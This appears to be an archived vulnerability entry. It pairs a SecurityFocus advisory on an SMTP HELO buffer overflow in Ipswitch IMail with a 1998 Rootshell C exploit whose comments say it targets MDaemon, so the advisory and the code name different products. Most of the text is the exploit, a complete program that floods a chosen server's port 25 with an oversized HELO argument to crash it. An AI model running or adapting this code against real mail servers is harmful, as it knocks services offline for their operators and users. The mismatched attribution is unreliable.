source: http://www.securityfocus.com/bid/8621/info

It has been reported that Ipswitch IMail server is prone to an SMTP HELO command argument buffer overflow vulnerability.

The issue presents itself likely due to insufficient bounds checking performed when handling malicious SMTP HELO command arguments of excessive length. It has been reported that a remote attacker may exploit this condition to trigger a denial of service in the affected daemon.

/* 
 * MDaemon SMTP server for Windows buffer overflow exploit 
 * 
 * http://www.mdaemon.com - if you dare... 
 * 
 * Tested on MDaemon 2.71 SP1 
 * 
 * http://www.rootshell.com/ 
 * 
 * Released 3/10/98 
 * 
 * (C) 1998 Rootshell All Rights Reserved 
 * 
 * For educational use only. Distribute freely. 
 * 
 * Note: This exploit will also crash the Microsoft Exchange 5.0 SMTP mail 
 * connector if SP2 has NOT been installed. 
 * 
 * Danger! 
 * 
 * A malicous user could use this bug to execute arbitrary code on the 
 * remote system. 
 * 
 */ 


#include <stdio.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netdb.h> 
#include <string.h> 
#include <stdlib.h> 
#include <unistd.h> 


void main(int argc, char *argv[]) 
{ 
  struct sockaddr_in sin; 
  struct hostent *hp; 
  char *buffer; 
  int sock, i; 


  if (argc != 2) { 
    printf("usage: %s <smtp server>\n", argv[0]); 
    exit(1); 
  } 
  hp = gethostbyname(argv[1]); 
  if (hp==NULL) { 
    printf("Unknown host: %s\n",argv[1]); 
    exit(1); 
  } 
  bzero((char*) &sin, sizeof(sin)); 
  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length); 
  sin.sin_family = hp->h_addrtype; 
  sin.sin_port = htons(25); 
  sock = socket(AF_INET, SOCK_STREAM, 0); 
  connect(sock,(struct sockaddr *) &sin, sizeof(sin)); 
  buffer = (char *)malloc(10000); 
  sprintf(buffer, "HELO "); 
  for (i = 0; i<4096; i++) 
    strcat(buffer, "x"); 
  strcat(buffer, "\r\n"); 
  write(sock, &buffer[0], strlen(buffer)); 
  close(sock); 
  free(buffer); 
} 